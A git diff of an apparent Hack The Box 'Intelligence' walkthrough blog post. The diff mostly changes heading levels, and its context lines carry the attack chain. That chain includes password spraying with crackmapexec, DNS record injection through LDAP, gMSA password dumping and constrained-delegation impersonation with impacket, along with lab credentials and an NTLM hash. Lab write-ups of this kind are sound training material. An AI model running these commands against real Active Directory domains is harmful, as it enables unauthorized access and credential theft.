@@ -32,9 +32,10 @@ cover:
     hidden: false # only hide on current single page
 ---
 
-### Enumeration
+## Enumeration
 
-#### Open Ports
+### Open Port
+
 ```Bash
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
@@ -53,14 +54,14 @@ PORT      STATE SERVICE       REASON          VERSION
 <STRIPED>
 ```
 
-### Web Enumeration
+## Web Enumeration
 
 {{< figure src="images/1.png">}}
 
 As we try to dowload the document we notice that file names are in date-stamps! Let's find out all the valid file names using feroxbuster.
 And then we can download them. I automated this process... 
 
-#### Create Date Stamp Wordlist
+### Create Date Stamp Wordlist
 
 I used [BruteSploit](https://github.com/Screetsec/BruteSploit/blob/master/tools/datelist) from github! To generate a wordlist from `2019 to 2021`
 
@@ -68,11 +69,11 @@ I used [BruteSploit](https://github.com/Screetsec/BruteSploit/blob/master/tools/
 
 I used the above command to generate the wordlist
 
-#### FeroxBuster
+### FeroxBuster
 
 {{< figure src="images/2.png">}}
 
-#### Dumper And Extractor
+### Dumper And Extractor
 
 I created a small py scripts to dump (dowload) those PDFs, and then extractor to get useful info like password?
 
@@ -112,7 +113,7 @@ for i in names:
 
 ```
 
-#### PDF File Enumeration
+### PDF File Enumeration
 
 I got the default password from the PDF file 
  
@@ -133,9 +134,9 @@ I made a users wordlist from exif of the pdf
 
 `exiftool * | grep Creator > users`
 
-### FootHold
+## FootHold
 
-#### Finding correct Credentials
+### Finding correct Credentials
 
 I ran the following command
 `crackmapexec smb intelligence.htb -u users -p "NewIntelligenceCorpUser9876" `
@@ -155,9 +156,9 @@ Now let's See whats in `Users` Shares
 Inside `Tiffany.Molina` folder in Desktop we find `user.txt`. **Got our flag!**
 
 
-### Privilege Escalation
+## Privilege Escalation
 
-#### Injecting DNS Record Using LDAP
+### Injecting DNS Record Using LDAP
 
 As we read the `downdetector.ps1` it checks with default creds if the site is alive/dead.
 
@@ -196,7 +197,7 @@ CREDENTIALS: `TED.GRAVES:Mr.Teddy`
 
 ---
 
-#### Read GMSA Password
+### Read GMSA Password
 
 `python3 gMSADumper.py -u "TED.GRAVES" -p "Mr.Teddy" -d intelligence.htb`
 
@@ -206,7 +207,7 @@ CREDENTIALS: `TED.GRAVES:Mr.Teddy`
 
 Now we have the hash of `svc_int$`
 
-#### Constrained Delegation Exploitation
+### Constrained Delegation Exploitation
 
 Following this [article](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
 
@@ -219,7 +220,7 @@ Following this [article](http://blog.redxorblue.com/2019/12/no-shells-required-u
 
 That step was done to check if it had *unconstrained delegation!*
 
-#### Constrained Delegation User Impersonation
+### Constrained Delegation User Impersonation
 
 `impacket-getST -spn www/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$ -hashes :5e47bac787e5e1970c
 f9acdb5b316239`
